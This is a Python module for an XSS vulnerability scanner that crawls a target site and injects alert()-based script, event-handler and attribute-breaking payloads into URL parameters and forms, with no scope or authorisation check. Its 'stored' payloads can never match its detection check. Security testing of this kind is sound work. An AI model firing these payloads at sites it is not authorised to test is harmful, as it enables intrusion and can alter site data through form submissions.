#!/usr/bin/env python3
"""
Traditional Website XSS Scanner Module
For classic HTML/CSS/JS websites with server-side rendering
Author: AI Assistant
Version: 1.0
"""

import requests
import re
import urllib.parse
import time
from urllib.parse import urljoin, urlparse, parse_qs
from bs4 import BeautifulSoup

class TraditionalScanner:
    def __init__(self, target_url, timeout=10):
        self.target_url = target_url
        self.timeout = timeout
        
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        })
        
        # Traditional XSS payloads
        self.payloads = {
            'reflected': [
                '<script>alert("XSS_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_CONFIRMED")>',
                '<svg onload=alert("XSS_CONFIRMED")>',
                '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
                '<body onload=alert("XSS_CONFIRMED")>'
            ],
            'stored': [
                '<script>alert("XSS_STORED_CONFIRMED")</script>',
                '<img src=x onerror=alert("XSS_STORED_CONFIRMED")>',
                '<svg onload=alert("XSS_STORED_CONFIRMED")>'
            ],
            'attribute': [
                '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
                "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
                '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
                "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='"
            ]
        }
        
        self.vulnerabilities = []
    
    def scan(self):
        """Main scanning method for traditional websites"""
        print(f"[TRADITIONAL] Starting traditional XSS scan for {self.target_url}")
        
        # Phase 1: Reconnaissance
        recon_data = self._reconnaissance()
        if not recon_data:
            return []
        
        # Phase 2: XSS Testing
        vulnerabilities = self._test_xss_vulnerabilities(recon_data)
        
        return vulnerabilities
    
    def _reconnaissance(self):
        """Traditional reconnaissance - crawl pages and extract parameters"""
        print("[TRADITIONAL] Starting reconnaissance...")
        
        discovered_urls = set()
        discovered_forms = []
        url_parameters = set()
        
        # Start with main URL
        discovered_urls.add(self.target_url)
        
        # Crawl up to 3 levels
        self._crawl_traditional(self.target_url, discovered_urls, discovered_forms, url_parameters, 0, 3)
        
        # Extract URL parameters
        for url in discovered_urls:
            parsed_url = urlparse(url)
            url_params = set(parse_qs(parsed_url.query).keys())
            url_parameters.update(url_params)
        
        print(f"[TRADITIONAL] Found {len(discovered_urls)} URLs, {len(discovered_forms)} forms, {len(url_parameters)} URL parameters")
        
        return {
            'urls': list(discovered_urls),
            'forms': discovered_forms,
            'url_parameters': list(url_parameters)
        }
    
    def _crawl_traditional(self, url, discovered_urls, discovered_forms, url_parameters, current_depth, max_depth):
        """Traditional crawling - extract links and forms from HTML"""
        if current_depth >= max_depth:
            return
        
        try:
            response = self.session.get(url, timeout=self.timeout)
            if response.status_code != 200:
                return
            
            soup = BeautifulSoup(response.text, 'html.parser')
            
            # Extract links
            for link in soup.find_all('a', href=True):
                href = link['href']
                if href and not href.startswith('#') and not href.startswith('javascript:'):
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    base_domain = urlparse(self.target_url).netloc
                    
                    if parsed.netloc == base_domain and not self._is_static_resource(full_url):
                        if full_url not in discovered_urls:
                            discovered_urls.add(full_url)
                            # Recursively crawl new URLs
                            self._crawl_traditional(full_url, discovered_urls, discovered_forms, url_parameters, current_depth + 1, max_depth)
            
            # Extract forms
            for form in soup.find_all('form'):
                form_data = {
                    'action': form.get('action', ''),
                    'method': form.get('method', 'GET').upper(),
                    'inputs': []
                }
                
                for input_tag in form.find_all(['input', 'textarea', 'select']):
                    input_data = {
                        'name': input_tag.get('name', ''),
                        'type': input_tag.get('type', 'text'),
                        'value': input_tag.get('value', ''),
                    }
                    form_data['inputs'].append(input_data)
                
                if form_data['action']:
                    form_data['action'] = urljoin(url, form_data['action'])
                else:
                    form_data['action'] = url
                
                discovered_forms.append(form_data)
            
        except Exception as e:
            print(f"[TRADITIONAL] Error crawling {url}: {str(e)}")
    
    def _test_xss_vulnerabilities(self, recon_data):
        """Test XSS vulnerabilities in traditional websites"""
        print("[TRADITIONAL] Testing XSS vulnerabilities...")
        
        vulnerabilities = []
        
        # Test URL parameters
        for url in recon_data['urls']:
            parsed_url = urlparse(url)
            url_params = parse_qs(parsed_url.query)
            
            for param_name in url_params:
                for payload_type, payloads in self.payloads.items():
                    for payload in payloads:
                        vuln = self._test_url_parameter(url, param_name, payload, payload_type)
                        if vuln:
                            vulnerabilities.append(vuln)
        
        # Test form parameters
        for form in recon_data['forms']:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload_type, payloads in self.payloads.items():
                        for payload in payloads:
                            vuln = self._test_form_parameter(form, input_field['name'], payload, payload_type)
                            if vuln:
                                vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    def _test_url_parameter(self, url, param_name, payload, payload_type):
        """Test URL parameter for XSS"""
        try:
            # Construct test URL
            parsed_url = urlparse(url)
            query_params = parse_qs(parsed_url.query)
            query_params[param_name] = [payload]
            
            new_query = urllib.parse.urlencode(query_params, doseq=True)
            test_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{new_query}"
            
            # Send request
            response = self.session.get(test_url, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS_CONFIRMED' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': test_url,
                    'parameter': param_name,
                    'payload': payload,
                    'payload_type': payload_type,
                    'response_length': len(response.text),
                    'confidence': 'high'
                }
        
        except Exception as e:
            print(f"[TRADITIONAL] Error testing URL parameter {param_name}: {str(e)}")
        
        return None
    
    def _test_form_parameter(self, form, param_name, payload, payload_type):
        """Test form parameter for XSS"""
        try:
            # Prepare form data
            form_data = {}
            for field in form['inputs']:
                if field['name'] == param_name:
                    form_data[field['name']] = payload
                else:
                    form_data[field['name']] = field['value']
            
            # Submit form
            if form['method'] == 'POST':
                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
            else:
                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
            
            # Check for XSS reflection
            if payload in response.text and 'XSS_CONFIRMED' in payload:
                return {
                    'type': 'reflected_xss',
                    'url': form['action'],
                    'parameter': param_name,
                    'payload': payload,
                    'payload_type': payload_type,
                    'method': form['method'],
                    'response_length': len(response.text),
                    'confidence': 'high'
                }
        
        except Exception as e:
            print(f"[TRADITIONAL] Error testing form parameter {param_name}: {str(e)}")
        
        return None
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf']
        return any(url.lower().endswith(ext) for ext in static_extensions)